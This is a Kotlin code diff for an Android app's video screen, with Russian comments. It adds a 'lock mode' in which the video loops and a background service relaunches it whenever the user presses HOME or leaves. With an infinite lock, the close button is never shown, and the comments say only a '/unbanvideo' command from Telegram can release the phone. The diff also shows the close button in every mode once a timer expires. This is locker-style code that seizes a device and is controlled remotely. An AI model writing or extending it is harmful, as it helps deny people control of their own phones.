@@ -42,6 +42,7 @@ class VideoActivity : AppCompatActivity() {
     private var videoFile: File? = null
     private var secondsWatched = 0
     private var watchTimer: Job? = null
+    private var isVideoFinished = false
 
     companion object {
         private const val TAG = "VideoActivity"
@@ -114,20 +115,21 @@ class VideoActivity : AppCompatActivity() {
 
     override fun onPause() {
         super.onPause()
-        if (lockActive) {
+        if (lockActive && !isVideoFinished) {
+            // Пользователь вышел пока видео ещё не кончилось
             val videoNum = this.intent.getIntExtra(EXTRA_VIDEO_NUM, 0)
             val url = videoUrl
             val dur = duration
             handler.postDelayed({
                 if (lockActive) {
-                    val restart = Intent(applicationContext, VideoActivity::class.java).apply {
-                        flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
+                    val serviceIntent = Intent(applicationContext, ControlService::class.java).apply {
+                        action = "RESTART_VIDEO"
                         if (videoNum > 0) putExtra(EXTRA_VIDEO_NUM, videoNum)
                         if (url != null) putExtra(EXTRA_VIDEO_URL, url)
                         putExtra(EXTRA_LOCK, true)
                         putExtra(EXTRA_DURATION, dur)
                     }
-                    applicationContext.startActivity(restart)
+                    applicationContext.startService(serviceIntent)
                 }
             }, 500L)
         }
@@ -169,15 +171,19 @@ class VideoActivity : AppCompatActivity() {
         // Крестик — скрыт пока не истечёт duration
         closeButton = ImageButton(this).apply {
             setImageResource(android.R.drawable.ic_menu_close_clear_cancel)
-            setBackgroundColor(android.graphics.Color.parseColor("#AA000000"))
+            setBackgroundColor(android.graphics.Color.parseColor("#CC000000"))
             alpha = 0f
             setPadding(24, 24, 24, 24)
             setOnClickListener {
-                if (!lockMode) finish()
+                if (alpha >= 1f) {
+                    isVideoFinished = true
+                    lockActive = false
+                    finish()
+                }
             }
         }
         root.addView(closeButton, FrameLayout.LayoutParams(120, 120, Gravity.TOP or Gravity.END).apply {
-            topMargin = 48; rightMargin = 48
+            topMargin = 80; rightMargin = 40
         })
 
         setContentView(root)
@@ -211,10 +217,10 @@ class VideoActivity : AppCompatActivity() {
             mediaPlayer!!.setOnVideoSizeChangedListener { _, w, h -> adjustSurfaceSize(w, h) }
             mediaPlayer!!.setOnCompletionListener {
                 if (lockMode) {
-                    // В режиме блокировки — зацикливаем
                     mediaPlayer?.seekTo(0)
                     mediaPlayer?.start()
                 } else {
+                    isVideoFinished = true
                     finish()
                 }
             }
@@ -238,13 +244,16 @@ class VideoActivity : AppCompatActivity() {
         watchTimer?.cancel()
 
         if (duration == 0 && !lockMode) {
-            // Нет ограничений — крестик сразу через 3 сек
-            handler.postDelayed({ showCloseButton() }, 3000L)
+            // Нет ограничений и не lock — крестик сразу через 3 сек
+            handler.postDelayed({
+                isVideoFinished = true  // не перезапускать при выходе
+                showCloseButton()
+            }, 3000L)
             return
         }
 
         if (duration == 0 && lockMode) {
-            // Бесконечный lock — крестик не показываем
+            // Бесконечный lock — только /unbanvideo из тг может разблокировать
             return
         }
 
@@ -261,13 +270,12 @@ class VideoActivity : AppCompatActivity() {
                     }
                 }
             }
-            // Время вышло — показываем крестик (если не lockMode) или закрываем
+            // Время вышло
             handler.post {
                 statusText.visibility = android.view.View.GONE
-                if (!lockMode) {
-                    showCloseButton()
-                }
-                // В lockMode крестик не появляется — только /unbanvideo из тг
+                isVideoFinished = true   // разрешаем выход через onPause
+                lockActive = false       // сбрасываем глобальный lock — HOME больше не перезапускает
+                showCloseButton()        // показываем крестик в любом режиме
             }
         }
     }
